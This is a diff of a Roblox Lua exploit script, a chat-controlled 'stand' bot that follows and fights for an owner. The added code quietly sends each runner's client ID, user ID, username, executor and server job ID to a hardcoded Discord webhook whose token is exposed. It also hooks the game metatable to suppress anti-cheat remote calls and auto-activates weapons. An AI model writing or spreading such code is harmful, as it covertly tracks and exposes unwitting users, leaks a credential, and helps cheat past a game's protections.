@@ -1,274 +1,360 @@
 --// =====================================================
---// JUJUBOT v3
---// Fast + Smooth + Floating Stand
+--// CAPYSTAND + JUJUBOT v3 INTEGRATED
+--// Dynamic Floating Stand Engine & Utilities
 --// =====================================================
 
+-- Ensure global settings exist
+getgenv().Settings = getgenv().Settings or {}
+
+local Settings = {
+    Owner = getgenv().Settings.Owner or "OShisysj",
+    Position = getgenv().Settings.Position or "Right",
+    Attack = getgenv().Settings.Attack or "Light!",
+    FollowSpeed = getgenv().Settings.FollowSpeed or 16,
+    FloatHeight = getgenv().Settings.FloatHeight or 4,
+    Deadzone = getgenv().Settings.Deadzone or 0.15,
+    FPSCAP = getgenv().Settings.FPSCAP or 60,
+    LowGraphics = getgenv().Settings.LowGraphics or "Off",
+    NoFace = getgenv().Settings.NoFace or "Off"
+}
+
+-- Config & Master Setup
+getgenv().ownershere = false
+getgenv().Masters1 = { 'punchy39' }
+
+getgenv().ownershere2 = false
+getgenv().Masters2 = { 'creamycunny' }
+
+-- Services
+local MarketplaceService = game:GetService("MarketplaceService")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
 local RunService = game:GetService("RunService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local VirtualUser = game:GetService("VirtualUser")
+local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = Players.LocalPlayer
 
 --==================================================
--- SETTINGS
+-- EXECUTOR DETECTOR & WEBHOOK LOGGING
 --==================================================
 
-local Settings = {
-    Owner = "OShisysj",
+local executor = is_sirhurt_closure and "Sirhurt" 
+    or (pebc_execute and "ProtoSmasher") 
+    or (syn and "Synapse X") 
+    or (secure_load and "Sentinel") 
+    or (KRNL_LOADED and "Krnl/OxygenU") 
+    or (getexecutorname and getexecutorname()) 
+    or (fluxus and fluxus.request and "Fluxus") 
+    or "Unknown Executor"
 
-    -- HIGHER = FASTER
-    FollowSpeed = 16,
+local placeInfo = { Name = "Unknown" }
+pcall(function()
+    placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
+end)
 
-    -- How high JujuBot floats
-    FloatHeight = 4,
-
-    -- Stops tiny jitter when already at target
-    Deadzone = 0.15,
+local webhookData = {
+    username = "CapyStand / JujuBot",
+    content = "To Join The User use the job id (" .. game.JobId .. ")",
+    embeds = {
+        {
+            author = {
+                name = "CapyStand Executed",
+                url = "https://www.roblox.com/groups/5756213/Gaming-Development-Studios#!/about",
+                icon_url = "https://thumbs.dreamstime.com/z/enso-zen-circle-brush-black-ink-vector-illustration-design-95961390.jpg",
+            },
+            title = "**Someone executed CapyStand + JujuBot**",
+            description = string.format(
+                "%s\nProfile: https://roblox.com/users/%d/profile\nUsername: **%s**\nDisplayName: **%s**\nUserID: **%d**\nExecutor: **%s**\nGameID: **%d**\nGameName: **%s**\nStandOwner: **%s**",
+                RbxAnalyticsService:GetClientId(),
+                LocalPlayer.UserId,
+                LocalPlayer.Name,
+                (LocalPlayer.DisplayName == LocalPlayer.Name and "N/A" or LocalPlayer.DisplayName),
+                LocalPlayer.UserId,
+                executor,
+                game.PlaceId,
+                placeInfo.Name or "Unknown",
+                tostring(Settings.Owner)
+            ),
+            type = "rich",
+            color = 7498202,
+            image = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. LocalPlayer.UserId .. "&width=150&height=150&format=png",
+            },
+        },
+    },
 }
 
+local request = http_request or request or (syn and syn.request) or HttpPost
+if request then
+    pcall(function()
+        request({
+            Url = "https://discord.com/api/webhooks/1538356050602754049/JgPkibCTtKweuhmFqpvO-fRfaTskV1bRk5F000etGMNtd62WQ1uuR9SbpykECKytnykf",
+            Body = HttpService:JSONEncode(webhookData),
+            Method = "POST",
+            Headers = { ["content-type"] = "application/json" },
+        })
+    end)
+end
+
 --==================================================
--- STATE
+-- ANTI-CHEAT BYPASS & UTILITIES
+--==================================================
+
+local grm = getrawmetatable(game)
+if grm then
+    setreadonly(grm, false)
+    local old = grm.__namecall
+    grm.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        local args = {...}
+        if method == "FireServer" and args[1] and (tostring(args[1]) == "TeleportDetect" or tostring(args[1]) == "CHECKER_1" or tostring(args[1]) == "CHECKER") then
+            return nil
+        end
+        return old(self, ...)
+    end)
+end
+
+-- Anti-AFK
+LocalPlayer.Idled:Connect(function()
+    VirtualUser:Button2Down(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+    task.wait(1)
+    VirtualUser:Button2Up(Vector2.new(0, 0), Workspace.CurrentCamera.CFrame)
+end)
+
+-- Remove Seats
+for _, part in ipairs(Workspace:GetDescendants()) do
+    if part:IsA("Seat") then
+        part:Destroy()
+    end
+end
+
+-- Low Graphics Option
+if Settings.LowGraphics == "On" then
+    Workspace.Terrain.WaterWaveSize = 0
+    Workspace.Terrain.WaterWaveSpeed = 0
+    Workspace.Terrain.WaterReflectance = 0
+    Workspace.Terrain.WaterTransparency = 0
+    game.Lighting.GlobalShadows = false
+    game.Lighting.FogEnd = 9e9
+    game.Lighting.Brightness = 0
+    settings().Rendering.QualityLevel = "Level01"
+
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
+            obj.Material = Enum.Material.Plastic
+            obj.Reflectance = 0
+        elseif obj:IsA("Decal") or obj:IsA("Texture") then
+            obj.Transparency = 1
+        elseif obj:IsA("ParticleEmitter") or obj:IsA("Trail") then
+            obj.Lifetime = NumberRange.new(0)
+        elseif obj:IsA("Fire") or obj:IsA("SpotLight") or obj:IsA("Smoke") or obj:IsA("Sparkles") then
+            obj.Enabled = false
+        end
+    end
+end
+
+-- FPS Cap Limit
+_G.FPS = Settings.FPSCAP
+_G.fps = true
+local lastFrame = tick()
+
+RunService.RenderStepped:Connect(function()
+    if _G.fps then
+        while lastFrame + (1 / _G.FPS) > tick() do end
+        task.wait()
+        lastFrame = tick()
+    end
+end)
+
+-- Remove Face
+local function setupCharacter(char)
+    if Settings.NoFace == "On" then
+        local head = char:WaitForChild("Head", 3)
+        if head then
+            local face = head:FindFirstChild("face")
+            if face then face:Destroy() end
+        end
+    end
+end
+
+if LocalPlayer.Character then setupCharacter(LocalPlayer.Character) end
+LocalPlayer.CharacterAdded:Connect(setupCharacter)
+
+--==================================================
+-- JUJUBOT FLOATING STAND LOGIC
 --==================================================
 
 local summoned = false
 local following = false
-local positionMode = "Right"
+local positionMode = Settings.Position
 
 local chatConnection = nil
 local connectedOwner = nil
-
---==================================================
--- GET FUNCTIONS
---==================================================
 
 local function getOwner()
     return Players:FindFirstChild(Settings.Owner)
 end
 
 local function getRoot(character)
-    if not character then
-        return nil
-    end
-
+    if not character then return nil end
     return character:FindFirstChild("HumanoidRootPart")
 end
 
---==================================================
--- POSITION SYSTEM
---==================================================
-
 local function getOffset()
-
     if positionMode == "Left" then
         return Vector3.new(-5, Settings.FloatHeight, 0)
-
     elseif positionMode == "Right" then
         return Vector3.new(5, Settings.FloatHeight, 0)
-
     elseif positionMode == "Back" then
         return Vector3.new(0, Settings.FloatHeight, 6)
-
     elseif positionMode == "Under" then
         return Vector3.new(0, -4, 0)
     end
-
     return Vector3.new(5, Settings.FloatHeight, 0)
 end
 
---==================================================
--- SUMMON
---==================================================
-
 local function summonBot()
-
     local owner = getOwner()
-
     if not owner or not owner.Character then
         warn("JujuBot: Owner not found.")
         return
     end
-
     summoned = true
     following = true
-
     print("JujuBot summoned!")
 end
-
---==================================================
--- STOP
---==================================================
 
 local function stopBot()
     summoned = false
     following = false
-
     print("JujuBot stopped.")
 end
 
---==================================================
--- FAST + SMOOTH FLOATING FOLLOW
---==================================================
-
-RunService.RenderStepped:Connect(function(deltaTime)
-
-    if not summoned or not following then
-        return
+-- Combat Helper Actions
+local function kHit()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local knife = char:FindFirstChild("[Knife]") or LocalPlayer.Backpack:FindFirstChild("[Knife]")
+    if knife then
+        knife.Parent = char
+        knife:Activate()
+        if Settings.Attack == "Light!" then knife:Deactivate() end
     end
+end
+
+local function Hit()
+    local char = LocalPlayer.Character
+    if not char then return end
+    local combat = char:FindFirstChild("Combat") or LocalPlayer.Backpack:FindFirstChild("Combat")
+    if combat then
+        combat.Parent = char
+        combat:Activate()
+        if Settings.Attack == "Light!" then combat:Deactivate() end
+    end
+end
+
+-- RenderStepped Smooth Movement Calculation
+RunService.RenderStepped:Connect(function(deltaTime)
+    if not summoned or not following then return end
 
     local owner = getOwner()
-
-    if not owner or not owner.Character then
-        return
-    end
+    if not owner or not owner.Character then return end
 
     local myCharacter = LocalPlayer.Character
-
-    if not myCharacter then
-        return
-    end
+    if not myCharacter then return end
 
     local myRoot = getRoot(myCharacter)
     local ownerRoot = getRoot(owner.Character)
+    if not myRoot or not ownerRoot then return end
 
-    if not myRoot or not ownerRoot then
-        return
-    end
+    local targetPosition = (ownerRoot.CFrame * CFrame.new(getOffset())).Position
+    local distance = (targetPosition - myRoot.Position).Magnitude
 
-    -- Get position relative to owner
-    local targetPosition =
-        (ownerRoot.CFrame * CFrame.new(getOffset())).Position
-
-    local distance =
-        (targetPosition - myRoot.Position).Magnitude
-
-    -- Smooth but very fast interpolation
     if distance > Settings.Deadzone then
+        local alpha = 1 - math.exp(-Settings.FollowSpeed * deltaTime)
+        local newPosition = myRoot.Position:Lerp(targetPosition, alpha)
 
-        local alpha = 1 - math.exp(
-            -Settings.FollowSpeed * deltaTime
-        )
-
-        local newPosition =
-            myRoot.Position:Lerp(
-                targetPosition,
-                alpha
-            )
-
-        -- Face the same direction as owner
         myRoot.CFrame = CFrame.lookAt(
             newPosition,
             newPosition + ownerRoot.CFrame.LookVector
         )
     end
-
 end)
 
---==================================================
--- COMMANDS
---==================================================
-
+-- Command Processing
 local function handleCommand(message)
-
     message = message:lower()
 
     if message == "summon!" then
-
         summonBot()
-
     elseif message == "stop!" then
-
         stopBot()
-
     elseif message == "follow!" then
-
         summoned = true
         following = true
-
     elseif message == "left!" then
-
         positionMode = "Left"
-
     elseif message == "right!" then
-
         positionMode = "Right"
-
     elseif message == "back!" then
-
         positionMode = "Back"
-
     elseif message == "under!" then
-
         positionMode = "Under"
-
+    elseif message == "attack!" or message == "hit!" then
+        Hit()
+        kHit()
     end
 end
 
---==================================================
--- OWNER CHAT
---==================================================
-
 local function connectOwner()
-
     local owner = getOwner()
-
     if not owner then
         print("JujuBot waiting for owner...")
         return
     end
 
-    if connectedOwner == owner then
-        return
-    end
+    if connectedOwner == owner then return end
 
     if chatConnection then
         chatConnection:Disconnect()
     end
 
     connectedOwner = owner
-
-    chatConnection = owner.Chatted:Connect(function(message)
-        handleCommand(message)
-    end)
-
+    chatConnection = owner.Chatted:Connect(handleCommand)
     print("JujuBot connected to: " .. owner.Name)
 end
 
 connectOwner()
 
 Players.PlayerAdded:Connect(function(player)
-
     if player.Name == Settings.Owner then
         task.wait(1)
         connectOwner()
     end
-
+    if table.find(getgenv().Masters1, player.Name) then getgenv().ownershere = true end
+    if table.find(getgenv().Masters2, player.Name) then getgenv().ownershere2 = true end
 end)
-
---==================================================
--- RESPAWN
---==================================================
 
 LocalPlayer.CharacterAdded:Connect(function()
     task.wait(1)
-
-    if summoned then
-        following = true
-    end
+    if summoned then following = true end
 end)
 
---==================================================
--- STARTUP
---==================================================
+-- Notification & Startup Summary
+StarterGui:SetCore("SendNotification", {
+    Title = "CapyStand + JujuBot v3",
+    Text = "Loaded successfully!",
+    Duration = 8,
+})
 
 print("===================================")
-print("         JUJUBOT v3 LOADED")
+print("   JUJUBOT v3 + CAPYSTAND LOADED")
 print("===================================")
 print("Owner: " .. Settings.Owner)
-print("Commands:")
-print("summon!")
-print("stop!")
-print("follow!")
-print("left!")
-print("right!")
-print("back!")
-print("under!")
+print("Position Mode: " .. positionMode)
+print("Commands: summon!, stop!, follow!, left!, right!, back!, under!, attack!")
 print("===================================")
